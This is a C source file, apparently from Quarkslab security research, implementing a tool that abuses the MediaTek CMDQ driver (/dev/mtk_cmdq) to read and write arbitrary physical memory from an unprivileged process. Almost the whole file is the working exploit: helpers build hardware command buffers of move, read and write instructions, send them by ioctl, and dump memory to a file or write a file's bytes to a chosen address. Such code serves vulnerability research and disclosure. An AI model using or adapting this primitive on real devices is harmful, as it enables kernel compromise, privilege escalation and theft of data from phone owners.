/* Copyright 2020 M. Rossi Bellom
 * Copyright 2020 Quarkslab
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <stdio.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <inttypes.h>

#include "mtk/cmdq_v3_driver.h"
#include "mtk/cmdq_def.h"
#include "mtk/cmdq_event_common.h"
#include "mtk/mtk-cmdq.h"

#define CMDQ_INST_SIZE 8
#define DMA_MAX 0x400 // hw dependant
int driver_fd;

// Trick to let the preload script log everything
uint32_t ioctl_hook (int code, int a, int b)
{
    return syscall(0x36, code, a, b);
}

// extracted from kernel sources
enum CMDQ_CODE_ENUM {
    /* these are actual HW op code */
    CMDQ_CODE_READ = 0x01,
    CMDQ_CODE_MOVE = 0x02,
    CMDQ_CODE_WRITE = 0x04,
    CMDQ_CODE_POLL = 0x08,
    CMDQ_CODE_JUMP = 0x10,
    CMDQ_CODE_WFE = 0x20, /* wait for event and clear */
    CMDQ_CODE_EOC = 0x40, /* end of command */
    /* these are pseudo op code defined by SW */
    /* for instruction generation */
    CMDQ_CODE_SET_TOKEN = 0x21,     /* set event */
    CMDQ_CODE_WAIT_NO_CLEAR = 0x22, /* wait event, but don't clear it */
    CMDQ_CODE_CLEAR_TOKEN = 0x23,   /* clear event */
    CMDQ_CODE_RAW = 0x24,       /* allow entirely custom arg_a/arg_b */
    CMDQ_CODE_PREFETCH_ENABLE = 0x41,  /* enable prefetch marker */
    CMDQ_CODE_PREFETCH_DISABLE = 0x42, /* disable prefetch marker */
}; 

// build command buf in order to write values at pa_address
static uint32_t write_address_buf(struct cmdqCommandStruct* command, uint64_t pa_address, uint32_t* values, uint32_t num_addr)
{
    uint32_t count = 0;
    uint32_t* cmd_buffer = command->pVABase;

    // WFE (to_wait=1, wait=1, to_update=1, update=0, event=CMDQ_SYNC_TOKEN_GPR_SET_4)
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 1 << 15 | 1 | 1 << 31 | 0 << 16;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_WFE << 24 | CMDQ_SYNC_TOKEN_GPR_SET_4;
    command->blockSize += 8;

    uint32_t offset = 0;
    while (count < num_addr) {
        // move value into CMDQ_DATA_REG_DEBUG
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = (uint32_t)values[count];
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_MOVE << 24 | 1 << 23
                                                        | CMDQ_DATA_REG_DEBUG << 16 
                                                        | (pa_address + offset) >> 0x20;
        command->blockSize += 8;

        // move pa_address + offset into CMDQ_DATA_REG_DEBUG_DST
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = (uint32_t)pa_address + offset;
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_MOVE << 24 | 1 << 23
                                                        | CMDQ_DATA_REG_DEBUG_DST << 16 
                                                        | (pa_address + offset) >> 0x20;
        command->blockSize += 8;


        //write CMDQ_DATA_REG_DEBUG into CMDQ_DATA_REG_DEBUG_DST
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = CMDQ_DATA_REG_DEBUG;
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_WRITE << 24 | 3 << 22
                                                          | CMDQ_DATA_REG_DEBUG_DST << 16;
        command->blockSize += 8;

        count++;
        offset += 4;
    }


    /* WFE */
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 0 << 15 | 0 | 1 << 31 | 1 << 16;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_WFE << 24 | CMDQ_SYNC_TOKEN_GPR_SET_4;
    command->blockSize += 8;

    /* EOC */
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 1;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_EOC << 24;
    command->blockSize += 8;

    /* JUMP */
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 8;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_JUMP << 24;
    command->blockSize += 8;

    return ioctl_hook(driver_fd, CMDQ_IOCTL_EXEC_COMMAND, command);
}

// build command buf to read memory at pa_address and put the values into dma_address
static uint32_t read_addresses_buf(struct cmdqCommandStruct* command, uint64_t pa_address, uint64_t dma_address, uint32_t num_addr)
{
    uint32_t count = 0;
    uint32_t* cmd_buffer = command->pVABase;

    // WFE (to_wait=1, wait=1, to_update=1, update=0, event=CMDQ_SYNC_TOKEN_GPR_SET_4)
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 1 << 15 | 1 | 1 << 31 | 0 << 16;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_WFE << 24 | CMDQ_SYNC_TOKEN_GPR_SET_4;
    command->blockSize += 8;

    uint32_t offset = 0;
    while (count < num_addr) {
        // move pa_address + offset into CMDQ_DATA_REG_DEBUG_DST
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = (uint32_t)pa_address + offset;
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_MOVE << 24 | 1 << 23
                                                        | CMDQ_DATA_REG_DEBUG_DST << 16 
                                                        | (pa_address + offset) >> 0x20;
        command->blockSize += 8;

        // read value at CMDQ_DATA_REG_DEBUG_DST into CMDQ_DATA_REG_DEBUG
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = CMDQ_DATA_REG_DEBUG;
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_READ << 24 | 3 << 22
                                                          | CMDQ_DATA_REG_DEBUG_DST << 16;
        command->blockSize += 8;

        // move dma_address + offset into CMDQ_DATA_REG_DEBUG_DST
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = (uint32_t)dma_address + offset;
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_MOVE << 24 | 1 << 23
                                                        | CMDQ_DATA_REG_DEBUG_DST << 16 
                                                        | (pa_address + offset) >> 0x20;
        command->blockSize += 8;

        //write CMDQ_DATA_REG_DEBUG into CMDQ_DATA_REG_DEBUG_DST
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = CMDQ_DATA_REG_DEBUG;
        *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_WRITE << 24 | 3 << 22
                                                          | CMDQ_DATA_REG_DEBUG_DST << 16;
        command->blockSize += 8;

        *(uint32_t*)((uint32_t)command->readAddress.dmaAddresses + offset) = (uint32_t)dma_address + offset;
        count++;
        offset += 4;
    }

    command->readAddress.count = offset;

    /* WFE */
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 0 << 15 | 0 | 1 << 31 | 1 << 16;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_WFE << 24 | CMDQ_SYNC_TOKEN_GPR_SET_4;
    command->blockSize += 8;

    /* EOC */
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 1;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_EOC << 24;
    command->blockSize += 8;

    /* JUMP */
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize) = 8;
    *(uint32_t*)((uint32_t)cmd_buffer + command->blockSize + 4) = CMDQ_CODE_JUMP << 24;
    command->blockSize += 8;

    return ioctl_hook(driver_fd, CMDQ_IOCTL_EXEC_COMMAND, command);
}

void dump_values(struct cmdqReadAddressStruct *read_address, uint64_t addr, char* fname)
{
    FILE* f = fopen(fname, "ab");
    for (int i = 0; i < read_address->count; i++) {
        fwrite((uint32_t*)(read_address->values + (i * 4)), sizeof(uint32_t), 1, f);
    }
    fclose(f);
}

// read and dump buffer at pa_address
uint32_t read_addresses(struct cmdqCommandStruct* command, uint64_t pa_address, uint64_t dma_address, uint32_t read_size, char* fname)
{
    uint64_t i = 0;
    uint32_t count = 0, num_bytes = read_size;

    if (num_bytes < DMA_MAX) {
        if (read_addresses_buf(command, pa_address, dma_address, num_bytes/4) < 0)
            return -1;
        dump_values(&command->readAddress, pa_address, fname);
        return 0;
    }

    while (i < num_bytes) {
        if (read_addresses_buf(command, pa_address + i, dma_address, DMA_MAX/4) < 0)
            return -1;
        dump_values(&command->readAddress, pa_address + i, fname);
        i += DMA_MAX;
    }

    if (i > num_bytes) {
        i -= DMA_MAX;
        if (read_addresses_buf(command, pa_address + i, dma_address, (num_bytes - i)/4) < 0)
            return -1;
        dump_values(&command->readAddress, pa_address + i, fname);
    }

    return 0;
}

// write a buf from file at pa_address
uint32_t write_addresses(struct cmdqCommandStruct* command,  char* fname, uint64_t pa_address)
{
    FILE *f = fopen(fname, "rb");
    uint32_t values[DMA_MAX], size;
    uint64_t offset = 0;

    do {
        size = fread(values, 1, DMA_MAX, f);
        if (size > 0)
            write_address_buf(command, pa_address + offset, values, (size / 4));
        offset += size;
    } while (size == DMA_MAX);

    fclose(f);
    return 0;
}

#define BUF_SIZE 0x3000

int main(int argc, char *argv[])
{
    short rw = 0; //0 read, 1 write
    uint64_t pa_address = 0;

    if (argc < 4) {
        printf("Usage command <r/w> <address> <file> [<read size>]\n");
        exit(-1);
    }

    if (*argv[1] == 'w')
        rw = 1;

    if (sscanf(argv[2], "%" SCNx64, &pa_address) != 1) {
        printf("Wrong address\n"); 
        exit(-2);
    }

    driver_fd = open("/dev/mtk_cmdq", O_RDONLY, S_IRWXU | S_IRWXG | S_IRWXO);

    if (driver_fd < 0) {
        perror("open device");
        return -1;
    }

    /* Allocate DMA buffer */
    struct cmdqWriteAddressStruct writeAddress= { .count = DMA_MAX };
    ioctl_hook(driver_fd, CMDQ_IOCTL_ALLOC_WRITE_ADDRESS, &writeAddress);

    printf("startPA = 0x%x\n", writeAddress.startPA);

    /* Send command */
    uint32_t* cmd_buffer = (uint32_t*) calloc(1, CMDQ_INST_SIZE * (BUF_SIZE + 8));
    uint64_t read_address = (uint64_t) malloc(BUF_SIZE);
    uint64_t read_values = (uint64_t) malloc(BUF_SIZE);

    struct cmdqCommandStruct command;
    memset(&command, 0, sizeof(struct cmdqCommandStruct));
    command.pVABase = (uint32_t)cmd_buffer;

    command.readAddress.dmaAddresses = read_address;
    command.readAddress.values       = read_values;
    command.readAddress.count        = 0;

    uint32_t success = 0;
    
    struct cmdqCommandStruct command2;
    memset(&command2, 0, sizeof(struct cmdqCommandStruct));
    command2.pVABase = (uint32_t)cmd_buffer;

    command2.readAddress.dmaAddresses = read_address;
    command2.readAddress.values       = read_values;
    command2.readAddress.count        = 0;
 
    if (rw == 1)
        /* write memory */
        success = write_addresses(&command2, argv[3], pa_address);
    else {
        /* Read memory */
        uint32_t size = 0x400;
        if (argc > 3 && (sscanf(argv[4], "%" SCNx32, &size) != 1)) {
            printf("Wrong read size, using default\n");
            size = 0x400;
        }

        success = read_addresses(&command2, pa_address, writeAddress.startPA, size, argv[3]);

    }

    /* Free DMA buffer */
    ioctl_hook(driver_fd, CMDQ_IOCTL_FREE_WRITE_ADDRESS, &writeAddress);

    close(driver_fd);

    return success;
}
